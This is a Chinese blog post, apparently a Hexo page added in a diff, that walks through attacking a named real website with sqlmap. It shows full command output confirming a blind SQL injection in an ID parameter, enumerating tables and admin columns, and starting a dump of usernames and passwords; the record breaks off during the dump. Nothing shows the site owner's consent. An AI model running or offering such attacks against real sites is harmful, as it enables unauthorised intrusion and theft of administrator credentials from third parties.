@@ -1,0 +1,1562 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-loading-bar.min.css?v=1.0.2">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=6.7.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.7.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.7.0" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '6.7.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="通过kali渗透ASP网站  1.打开终端输入 sqlmap -u &amp;quot;网址&amp;quot;  ———————————————————————————————————————————————————————————————————————————————————————— root@kali:~# sqlmap -u &amp;quot;http://40.cavtc.cn/NewsShow.asp">
+<meta name="keywords" content="KALI,SQLMAP,ASP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="通过kali渗透ASP网站">
+<meta property="og:url" content="https://github.com/JD1412/JD1412.github.io.git/2019/01/14/通过kali渗透ASP网站/index.html">
+<meta property="og:site_name" content="JD1412">
+<meta property="og:description" content="通过kali渗透ASP网站  1.打开终端输入 sqlmap -u &amp;quot;网址&amp;quot;  ———————————————————————————————————————————————————————————————————————————————————————— root@kali:~# sqlmap -u &amp;quot;http://40.cavtc.cn/NewsShow.asp">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-01-13T22:17:27.970Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="通过kali渗透ASP网站">
+<meta name="twitter:description" content="通过kali渗透ASP网站  1.打开终端输入 sqlmap -u &amp;quot;网址&amp;quot;  ———————————————————————————————————————————————————————————————————————————————————————— root@kali:~# sqlmap -u &amp;quot;http://40.cavtc.cn/NewsShow.asp">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="JD1412" type="application/atom+xml">
+
+
+
+
+  <link rel="canonical" href="https://github.com/JD1412/JD1412.github.io.git/2019/01/14/通过kali渗透ASP网站/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>通过kali渗透ASP网站 | JD1412</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <a href="https://github.com/JD1412/JD1412.github.io.github" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">JD1412</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">黑色的眼睛</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-schedule">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/schedule/" rel="section"><i class="menu-item-icon fa fa-fw fa-calendar"></i> <br>日程表</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-commonweal">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/404/" rel="section"><i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br>公益 404</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://github.com/JD1412/JD1412.github.io.git/2019/01/14/通过kali渗透ASP网站/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Healer">
+      <meta itemprop="description" content="桃李不言，下自成蹊">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="JD1412">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">通过kali渗透ASP网站
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-01-14 06:16:54 / 修改时间：06:17:27" itemprop="dateCreated datePublished" datetime="2019-01-14T06:16:54+08:00">2019-01-14</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/security/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<h1 id="通过kali渗透ASP网站"><a href="#通过kali渗透ASP网站" class="headerlink" title="通过kali渗透ASP网站"></a>通过kali渗透ASP网站</h1></blockquote>
+<ul>
+<li><p>1.打开终端输入</p>
+<pre><code>sqlmap -u &quot;网址&quot;
+
+————————————————————————————————————————————————————————————————————————————————————————
+root@kali:~# sqlmap -u &quot;http://40.cavtc.cn/NewsShow.aspx?ID=3239&quot;
+         _
+ ___ ___| |_____ ___ ___  {1.0-dev-nongit-201707310a89}
+|_ -| . | |     | .&apos;| . |
+|___|_  |_|_|_|_|__,|  _|
+      |_|           |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&apos;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 10:31:49
+
+[10:31:50] [INFO] testing connection to the target URL
+[10:31:52] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[10:31:56] [INFO] testing if the target URL is stable
+[10:31:59] [WARNING] target URL is not stable. sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user&apos;s manual paragraph &apos;Page comparison&apos; and provide a string or regular expression to match on
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] c
+[10:32:33] [INFO] testing if GET parameter &apos;ID&apos; is dynamic
+[10:32:33] [INFO] confirming that GET parameter &apos;ID&apos; is dynamic
+[10:32:33] [INFO] GET parameter &apos;ID&apos; is dynamic
+[10:32:37] [INFO] heuristic (basic) test shows that GET parameter &apos;ID&apos; might be injectable
+[10:32:37] [INFO] testing for SQL injection on GET parameter &apos;ID&apos;
+[10:32:37] [INFO] testing &apos;AND boolean-based blind - WHERE or HAVING clause&apos;
+[10:32:38] [WARNING] reflective value(s) found and filtering out
+[10:32:42] [INFO] GET parameter &apos;ID&apos; seems to be &apos;AND boolean-based blind - WHERE or HAVING clause&apos; injectable 
+[10:32:42] [INFO] testing &apos;MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause&apos;
+[10:32:42] [INFO] testing &apos;PostgreSQL AND error-based - WHERE or HAVING clause&apos;
+[10:32:43] [INFO] testing &apos;Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause&apos;
+[10:32:43] [INFO] testing &apos;Oracle AND error-based - WHERE or HAVING clause (XMLType)&apos;
+[10:32:44] [INFO] testing &apos;MySQL &gt;= 5.0 error-based - Parameter replace&apos;
+[10:32:44] [INFO] testing &apos;MySQL inline queries&apos;
+[10:32:44] [INFO] testing &apos;PostgreSQL inline queries&apos;
+[10:32:45] [INFO] testing &apos;Microsoft SQL Server/Sybase inline queries&apos;
+[10:32:45] [INFO] testing &apos;MySQL &gt; 5.0.11 stacked queries (SELECT - comment)&apos;
+[10:32:45] [WARNING] time-based comparison requires larger statistical model, please wait............
+[10:33:18] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option &apos;--time-sec&apos; as possible (e.g. 10 or more)
+[10:33:19] [INFO] testing &apos;PostgreSQL &gt; 8.1 stacked queries (comment)&apos;
+[10:33:19] [INFO] testing &apos;Microsoft SQL Server/Sybase stacked queries (comment)&apos;
+[10:33:20] [INFO] testing &apos;Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)&apos;
+[10:33:21] [INFO] testing &apos;MySQL &gt;= 5.0.12 AND time-based blind (SELECT)&apos;
+[10:33:21] [INFO] testing &apos;PostgreSQL &gt; 8.1 AND time-based blind&apos;
+[10:33:22] [INFO] testing &apos;Microsoft SQL Server/Sybase time-based blind&apos;
+[10:33:22] [INFO] testing &apos;Oracle AND time-based blind&apos;
+[10:33:22] [INFO] testing &apos;Generic UNION query (NULL) - 1 to 20 columns&apos;
+[10:33:22] [WARNING] using unescaped version of the test because of zero knowledge of the back-end DBMS. You can try to explicitly set it using option &apos;--dbms&apos;
+[10:33:22] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[10:33:33] [INFO] testing &apos;MySQL UNION query (NULL) - 1 to 20 columns&apos;
+[10:33:44] [INFO] checking if the injection point on GET parameter &apos;ID&apos; is a false positive
+GET parameter &apos;ID&apos; is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
+sqlmap identified the following injection point(s) with a total of 82 HTTP(s) requests:
+---
+Parameter: ID (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: ID=3239 AND 1305=1305
+---
+[10:37:45] [INFO] testing MySQL
+[10:37:46] [WARNING] the back-end DBMS is not MySQL
+[10:37:46] [INFO] testing Oracle
+[10:37:47] [WARNING] the back-end DBMS is not Oracle
+[10:37:47] [INFO] testing PostgreSQL
+[10:37:47] [WARNING] the back-end DBMS is not PostgreSQL
+[10:37:47] [INFO] testing Microsoft SQL Server
+[10:37:48] [WARNING] the back-end DBMS is not Microsoft SQL Server
+[10:37:48] [INFO] testing SQLite
+[10:37:48] [WARNING] the back-end DBMS is not SQLite
+[10:37:48] [INFO] testing Microsoft Access
+[10:37:51] [INFO] confirming Microsoft Access
+[10:37:53] [INFO] the back-end DBMS is Microsoft Access
+ ------------------------------------------------------------------------------------
+|    web server operating system: Windows 2003 or XP                                 |
+|    web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727       |
+|    back-end DBMS: Microsoft Access                                                 |
+ ------------------------------------------------------------------------------------
+[10:37:53] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 67 times
+[10:37:53] [INFO] fetched data logged to text files under &apos;/root/.sqlmap/output/40.cavtc.cn&apos;
+
+[*] shutting down at 10:37:53
+</code></pre></li>
+</ul>
+<pre><code>#### 如果有漏洞会返回数据库相关信息
+</code></pre><ul>
+<li><p>2.猜解表名</p>
+<pre><code>sqlmap -u &quot;网址&quot; --tables
+
+root@kali:~# sqlmap -u &quot;http://40.cavtc.cn/NewsShow.aspx?ID=3239&quot; --tables
+         _
+ ___ ___| |_____ ___ ___  {1.0-dev-nongit-201707310a89}
+|_ -| . | |     | .&apos;| . |
+|___|_  |_|_|_|_|__,|  _|
+      |_|           |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&apos;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 10:41:45
+
+[10:41:45] [INFO] resuming back-end DBMS &apos;microsoft access&apos; 
+[10:41:47] [INFO] testing connection to the target URL
+[10:41:49] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: ID (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: ID=3239 AND 1305=1305
+---
+[10:41:52] [INFO] the back-end DBMS is Microsoft Access
+web server operating system: Windows 2003 or XP
+web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727
+back-end DBMS: Microsoft Access
+[10:41:52] [INFO] fetching tables for database: &apos;Microsoft_Access_masterdb&apos;
+[10:41:52] [INFO] fetching number of tables for database &apos;Microsoft_Access_masterdb&apos;
+[10:41:52] [WARNING] running in a single-thread mode. Please consider usage of option &apos;--threads&apos; for faster data retrieval
+[10:41:52] [INFO] retrieved: 
+[10:41:53] [WARNING] in case of continuous data retrieval problems you are advised to try a switch &apos;--no-cast&apos; 
+[10:41:53] [WARNING] unable to retrieve the number of tables for database &apos;Microsoft_Access_masterdb&apos;
+[10:41:53] [ERROR] cannot retrieve table names, back-end DBMS is Access
+
+do you want to use common table existence check? [Y/n/q] y   //   此处默认选y
+
+[10:41:59] [INFO] checking table existence using items from &apos;/usr/share/sqlmap/txt/common-tables.txt&apos;
+[10:41:59] [INFO] adding words used on web page to the check list
+
+please enter number of threads? [Enter for 1 (current)] 10     //    线程设置为10即可
+
+[10:42:06] [INFO] starting 10 threads
+[10:42:12] [INFO] retrieved: admin                                                                                                         
+[10:42:13] [INFO] retrieved: news                                                                                                          
+[10:42:38] [INFO] retrieved: ads                                                                                                           
+
+Database: Microsoft_Access_masterdb
+[3 tables]
++-------+
+| admin |
+| ads   |
+| news  |
++-------+
+
+[10:45:43] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 3144 times
+[10:45:43] [INFO] fetched data logged to text files under &apos;/root/.sqlmap/output/40.cavtc.cn&apos;
+
+[*] shutting down at 10:45:43
+</code></pre><h4 id="根据经验确定用户名（username，password）"><a href="#根据经验确定用户名（username，password）" class="headerlink" title="根据经验确定用户名（username，password）"></a>根据经验确定用户名（username，password）</h4></li>
+<li><p>3.猜解列名（字段）</p>
+<pre><code>sqlmap -u &quot;网址&quot; --columns -T &quot;表名（上一步确定的）&quot;
+</code></pre></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# sqlmap -u &quot;http://40.cavtc.cn/NewsShow.aspx?ID=3239&quot; --columns -T &quot;admin&quot;</span><br><span class="line">         _</span><br><span class="line"> ___ ___| |_____ ___ ___  &#123;1.0-dev-nongit-201707310a89&#125;</span><br><span class="line">|_ -| . | |     | .&apos;| . |</span><br><span class="line">|___|_  |_|_|_|_|__,|  _|</span><br><span class="line">      |_|           |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&apos;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting at 11:07:47</span><br><span class="line"></span><br><span class="line">[11:07:48] [INFO] resuming back-end DBMS &apos;microsoft access&apos; </span><br><span class="line">[11:07:48] [INFO] testing connection to the target URL</span><br><span class="line">[11:07:50] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: ID (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: ID=3239 AND 1305=1305</span><br><span class="line">---</span><br><span class="line">[11:07:53] [INFO] the back-end DBMS is Microsoft Access</span><br><span class="line">web server operating system: Windows 2003 or XP</span><br><span class="line">web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727</span><br><span class="line">back-end DBMS: Microsoft Access</span><br><span class="line">[11:07:53] [ERROR] cannot retrieve column names, back-end DBMS is Access</span><br><span class="line">do you want to use common column existence check? [Y/n/q] y</span><br><span class="line">[11:08:00] [WARNING] in case of continuous data retrieval problems you are advised to try a switch &apos;--no-cast&apos; </span><br><span class="line">[11:08:00] [INFO] checking column existence using items from &apos;/usr/share/sqlmap/txt/common-columns.txt&apos;</span><br><span class="line">[11:08:00] [INFO] adding words used on web page to the check list</span><br><span class="line">please enter number of threads? [Enter for 1 (current)] 20</span><br><span class="line">[11:08:02] [CRITICAL] maximum number of used threads is 10 avoiding potential connection issues</span><br><span class="line">please enter number of threads? [Enter for 1 (current)] 10</span><br><span class="line">[11:08:05] [INFO] starting 10 threads</span><br><span class="line">[11:08:07] [INFO] retrieved: id                                                                                                            </span><br><span class="line">[11:08:09] [INFO] retrieved: username                                                                                                      </span><br><span class="line">[11:08:19] [INFO] retrieved: password                                                                                                      </span><br><span class="line">[11:08:36] [INFO] retrieved: department                                                                                                    </span><br><span class="line">[11:10:51] [INFO] retrieved: classid                                                                                                       </span><br><span class="line">                                                                                                                                           </span><br><span class="line">Database: Microsoft_Access_masterdb</span><br><span class="line">Table: admin</span><br><span class="line">[5 columns]</span><br><span class="line">+------------+-------------+</span><br><span class="line">| Column     | Type        |</span><br><span class="line">+------------+-------------+</span><br><span class="line">| classid    | numeric     |</span><br><span class="line">| department | non-numeric |</span><br><span class="line">| id         | numeric     |</span><br><span class="line">| password   | non-numeric |</span><br><span class="line">| username   | non-numeric |</span><br><span class="line">+------------+-------------+</span><br><span class="line"></span><br><span class="line">[11:11:11] [WARNING] HTTP error codes detected during run:</span><br><span class="line">500 (Internal Server Error) - 2499 times</span><br><span class="line">[11:11:11] [INFO] fetched data logged to text files under &apos;/root/.sqlmap/output/40.cavtc.cn&apos;</span><br><span class="line"></span><br><span class="line">[*] shutting down at 11:11:11</span><br></pre></td></tr></table></figure>
+<pre><code>#### --columns  猜列名 根据表  “表名”
+#### 一般会出现username，那么密码字段一定是password
+</code></pre><ul>
+<li><p>4.下载数据</p>
+<pre><code>sqlmap -u &quot;网址&quot; --dump -C &quot;username,password&quot; -T &quot;user&quot;
+</code></pre></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# sqlmap -u &quot;http://40.cavtc.cn/NewsShow.aspx?ID=3239&quot; --dump -C &quot;username,password&quot;</span><br><span class="line">         _</span><br><span class="line"> ___ ___| |_____ ___ ___  &#123;1.0-dev-nongit-201707310a89&#125;</span><br><span class="line">|_ -| . | |     | .&apos;| . |</span><br><span class="line">|___|_  |_|_|_|_|__,| 